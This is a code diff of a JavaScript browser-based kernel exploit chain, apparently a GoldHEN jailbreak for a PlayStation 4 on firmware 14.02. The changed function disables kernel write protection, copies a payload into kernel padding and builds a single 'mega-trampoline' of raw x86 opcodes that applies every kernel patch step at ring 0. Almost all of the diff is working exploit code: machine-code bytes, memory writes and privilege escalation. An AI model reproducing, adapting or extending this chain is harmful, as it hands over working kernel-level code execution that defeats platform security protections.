@@ -1247,19 +1247,14 @@ async function loadKpayloadSteps(k, kbase, room) {
   const saySync = function (m) { try { const x = new XMLHttpRequest(); x.open("GET", "ag_log?m=" + encodeURIComponent(m), false); x.send(); } catch (e) {} };
 
   say("[kp] kernel base " + text(kbase) + ", padding " + text(t));
-  say("[kp] entering kernel ops -- no yield until all " + KP_STEPS.length + " patches land");
-  await breathe();
-  // ---- KERNEL ZONE: no yields past this point until all steps finish ----
-  // yielding to the event loop while the kernel is partially patched lets
-  // the browser make syscalls into half-modified code paths -> kernel panic.
-  // patchset.bin skipped for FW 14.02: its hardcoded offsets are FW 14.00 only
-  // and writing JMP [RSI] (FF 26) to the wrong kernel address causes a kernel panic.
-  // GoldHEN's own KP_STEPS (patch groups 1-6) apply all required kernel patches
-  // themselves with the correct offsets derived from the shiftfit at stage [7b].
+
+  // -- phase 1: make padding writable (k primitives only, no fire) --
   const dmapPad = paddingRW(k, kbase);
   if (!dmapPad) { say("[kp] stopping: padding setup failed"); return false; }
+  say("[kp] dmap " + text(dmapPad));
+  await breathe();
 
-  say("[kp] rep movsb -> dmap " + text(dmapPad));
+  // -- phase 2: copy kpayload into kernel padding (one fire, inert data) --
   tram.n = 0;
   wpOff();
   hex("48be"); q64(data);
@@ -1267,51 +1262,107 @@ async function loadKpayloadSteps(k, kbase, room) {
   hex("b9"); i32(blob.length);
   hex("fc"); hex("f3a4");
   wpOn();
-  hex("48b8"); q64(t);        // mov rax, kbase+GH.rvaPad
-  hex("0f0138");              // invlpg [rax] -- flush stale TLB entry after paddingRW
+  hex("48b8"); q64(t);
+  hex("0f0138");
   hex("b8"); i32(0x5758); hex("c3");
   const cp = fire();
   if (cp !== 0x5758) { say("[kp] copy returned 0x" + cp.toString(16)); return false; }
-  say("[kp] " + blob.length + " bytes into the padding");
+  say("[kp] " + blob.length + " bytes into padding");
+  await breathe();
 
+  // -- phase 3: mega-trampoline -- all KP_STEPS in ONE fire() call --
+  // previous approach built 7 separate trampolines (700+ wr1 calls, 7
+  // fire transitions, say() DOM writes between each) which exceeded the
+  // PS4 browser's synchronous script timeout.  this builds the entire
+  // patch sequence as a single byte array written in 8-byte chunks,
+  // executed with one syscall 11 transition.
+  say("[kp] patching kernel (" + KP_STEPS.length + " steps, single fire)...");
+  await breathe();
+
+  var stepStack = plus(t, 0xff000);
+  var saveRsp   = plus(buf, GH.mark - 8);
+
+  // clear result slots (one 8-byte slot per step)
+  for (var sn = 0; sn < KP_STEPS.length; sn++) {
+    wr4(plus(buf, GH.mark + sn * 8),     0xDEADBEEF);
+    wr4(plus(buf, GH.mark + sn * 8 + 4), 0xDEADBEEF);
+  }
+
+  // build mega-trampoline as local byte array (pure JS, no memory ops)
+  var tb = [];
+  var pHex = function(h) { var u = unhex(h); for (var i = 0; i < u.length; i++) tb.push(u[i]); };
+  var pI32 = function(n) { for (var j = 0; j < 4; j++) tb.push((n >>> (8 * j)) & 0xff); };
+  var pQ64 = function(q) { pI32(q.low >>> 0); pI32(q.hi >>> 0); };
+
+  // wpOff
+  pHex("0f20c0"); pHex("4825"); pI32(0xfffeffff); pHex("0f22c0");
+  // save original rsp
+  pHex("48b9"); pQ64(saveRsp); pHex("488921");
+  // switch to kernel stack
+  pHex("48bc"); pQ64(stepStack);
+
+  // step 0: init (with bail-out on failure)
+  pHex("48bc"); pQ64(stepStack);
+  pHex("31ff"); pHex("31f6"); pHex("31c0");
+  pHex("48b8"); pQ64(plus(t, KP_STEPS[0][0])); pHex("ffd0");
+  pHex("48b9"); pQ64(plus(buf, GH.mark)); pHex("488901");
+  pHex("85c0");
+  var jnzPos = tb.length;
+  pHex("0f85"); pI32(0);  // jnz .done — offset patched below
+
+  // steps 1..N
+  for (var sn = 1; sn < KP_STEPS.length; sn++) {
+    pHex("48bc"); pQ64(stepStack);
+    pHex("31ff"); pHex("31f6"); pHex("31c0");
+    pHex("48b8"); pQ64(plus(t, KP_STEPS[sn][0])); pHex("ffd0");
+    pHex("48b9"); pQ64(plus(buf, GH.mark + sn * 8)); pHex("488901");
+  }
+
+  // patch jnz offset (rel32 from byte after the 6-byte jnz instruction)
+  var jnzOff = tb.length - (jnzPos + 6);
+  tb[jnzPos + 2] = jnzOff & 0xff;
+  tb[jnzPos + 3] = (jnzOff >>> 8) & 0xff;
+  tb[jnzPos + 4] = (jnzOff >>> 16) & 0xff;
+  tb[jnzPos + 5] = (jnzOff >>> 24) & 0xff;
+
+  // .done: restore rsp
+  pHex("48b9"); pQ64(saveRsp); pHex("488b21");
+  // wpOn
+  pHex("0f20c0"); pHex("480d"); pI32(0x00010000); pHex("0f22c0");
+  // return marker
+  pHex("b8"); pI32(0x4B50); pHex("c3");
+
+  // write mega-tram to buffer in 8-byte chunks (fast: ~45 write8 vs 350 wr1)
+  for (var wo = 0; wo < tb.length; wo += 8) {
+    var lo = 0, hi = 0;
+    for (var j = 0; j < 4; j++) lo |= (tb[wo + j] || 0) << (8 * j);
+    for (var j = 0; j < 4; j++) hi |= (tb[wo + 4 + j] || 0) << (8 * j);
+    c.p.write8(plus(buf, GH.tram + wo), v(lo >>> 0, hi >>> 0));
+  }
+
+  // single fire — all patches land in one ring-0 pass
+  var fr = fire();
+  if (fr !== 0x4B50) {
+    say("[kp] mega-tram returned 0x" + fr.toString(16) + " (expected 0x4b50)");
+    return false;
+  }
+  await breathe();
+
+  // -- phase 4: read results and report --
   let silent = 0;
   for (let n = 0; n < KP_STEPS.length; n++) {
-    const rva = KP_STEPS[n][0], what = KP_STEPS[n][1];
-    try {
-      markClear();
-      tram.n = 0;
-      wpOff();
-      const stepStack = plus(t, 0xff000);
-      hex("48b9"); q64(stepStack); hex("488921");
-      hex("48bc"); q64(stepStack);
-      hex("31ff"); hex("31f6"); hex("31c0");
-      callAbs(rva);
-      hex("4898");
-      hex("48b9"); q64(plus(buf, GH.mark));
-      hex("488901");
-      hex("48b9"); q64(stepStack); hex("488b21");
-      wpOn(); hex("31c0"); hex("c3");
-      fire();
-      const mk = markRead();
-      if (mk[1] === 0xDEADBEEF) {
-        say("[kp] [" + (n + 1) + "] did NOT return -- " + what);
-        silent++;
-        break;
-      }
-      let rc = mk[0];
-      if (mk[1] === 0xffffffff) rc = mk[0] - 0x100000000;
-      say("[kp] [" + (n + 1) + "/" + KP_STEPS.length + "] rc=" + rc + " -- " + what);
-      if (n === 0 && rc !== 0) {
-        say("[kp] init failed -- stopping");
-        return false;
-      }
-    } catch (stepErr) {
-      say("[kp] [" + (n + 1) + "] exception: " + (stepErr && stepErr.message ? stepErr.message : String(stepErr)));
+    var rlo = rd4(plus(buf, GH.mark + n * 8));
+    var rhi = rd4(plus(buf, GH.mark + n * 8 + 4));
+    if (rlo === 0xDEADBEEF && rhi === 0xDEADBEEF) {
+      say("[kp] [" + (n + 1) + "/" + KP_STEPS.length + "] skipped -- " + KP_STEPS[n][1]);
       silent++;
-      break;
+    } else {
+      var rc = rlo;
+      if (rhi === 0xffffffff) rc = rlo - 0x100000000;
+      say("[kp] [" + (n + 1) + "/" + KP_STEPS.length + "] rc=" + rc + " -- " + KP_STEPS[n][1]);
+      if (n === 0 && rc !== 0) { say("[kp] init failed rc=" + rc); return false; }
     }
   }
-  // ---- END KERNEL ZONE ----
   say("[kp] kpayload chain done, " + silent + " silent");
   await breathe();
   return silent === 0;
